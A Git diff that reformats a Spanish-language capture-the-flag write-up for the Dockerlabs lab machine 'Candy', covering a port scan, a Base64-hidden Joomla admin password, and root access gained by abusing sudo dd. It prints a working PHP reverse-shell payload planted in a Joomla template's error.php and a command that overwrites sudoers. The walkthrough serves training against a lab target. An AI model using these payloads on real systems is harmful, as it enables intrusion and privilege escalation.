@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Candy 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Candy ​​
+
+## 🖥️ Writeup - Candy
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Joomla` `PHP` `Base64` `Information Leakage` `RCE` `Lateral Movement` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip candy.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh candy.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 18:17 CET
 Nmap scan report for 172.17.0.2
@@ -78,8 +87,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
 ```
 
-Solo el puerto `80` está accesible. El escaneo también revela un archivo `robots.txt` y confirma que el sitio utiliza el `CMS Joomla!`.
-En el interior del archivo `robots.txt` encontramos la siguiente información:
+Solo el puerto `80` está accesible. El escaneo también revela un archivo `robots.txt` y confirma que el sitio utiliza el `CMS Joomla!`. En el interior del archivo `robots.txt` encontramos la siguiente información:
 
 ```
 User-agent: *
@@ -113,6 +121,7 @@ echo "c2FubHVpczEyMzQ1" | Base64 -d
 ```
 
 Info:
+
 ```
 sanluis12345
 ```
@@ -121,7 +130,7 @@ Obtenemos `sanluis12345`. Intuimos que `admin` : `sanluis12345` son las credenci
 
 Navegamos a la ruta `/administrator` para autenticarnos con las credenciales encontradas.
 
-![alt text](../../images/joomla.png)
+![alt text](../../.gitbook/assets/joomla.png)
 
 Logramos acceder con éxito al panel de administración.
 
@@ -130,13 +139,14 @@ Nuestro objetivo ahora es obtener una `reverse shell`. En `Joomla!`, un vector c
 Concretamente, decidimos modificar el archivo `error.php`. Inyectamos nuestro `payload` de `PHP` al inicio del archivo. Este se activará cuando accedamos al `error.php` directamente desde el navegador.
 
 Payload:
+
 ```
 <?php
   system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'");
 ?>
 ```
 
-![alt text](../../images/revshelljoomla.png)
+![alt text](../../.gitbook/assets/revshelljoomla.png)
 
 Guardamos los cambios.
 
@@ -153,6 +163,7 @@ http://172.17.0.2/templates/cassiopeia/error.php
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 54510
@@ -163,31 +174,35 @@ www-data@5bc7cbda960b:/var/www/html/joomla/templates/cassiopeia$
 
 Recibimos la `reverse shell` en nuestro listener como usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
-Una vez dentro, comprobamos permisos `sudo` y `SUID`, pero no encontramos nada.
-Leemos el archivo `/etc/passwd` y encontramos que existe un usuario llamado `luisillo`.
+Una vez dentro, comprobamos permisos `sudo` y `SUID`, pero no encontramos nada. Leemos el archivo `/etc/passwd` y encontramos que existe un usuario llamado `luisillo`.
 
 Buscamos entre los directorios y acabamos encontrando, en `/var/backups/hidden/`, un archivo llamado `otro_caramelo.txt`, con el siguiente contenido:
 
@@ -235,6 +250,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for luisillo on 5bc7cbda960b:
     env_reset, mail_badpass,
@@ -260,13 +276,14 @@ echo "luisillo ALL=(ALL) NOPASSWD:ALL" | sudo /bin/dd of=$LFILE
 ```
 
 Info:
+
 ```
 0+1 records in
 0+1 records out
 32 bytes copied, 3.048e-05 s, 1.0 MB/s
 ```
 
-Los cambios se han aplicado correctamente. 
+Los cambios se han aplicado correctamente.
 
 Gracias a esta modificación, ahora el usuario `luisillo` puede autenticarse como `root` sin tener que proporcionar una contraseña.
 
@@ -275,6 +292,7 @@ sudo /bin/bash
 ```
 
 Info:
+
 ```
 root@5bc7cbda960b:/tmp# whoami
 root
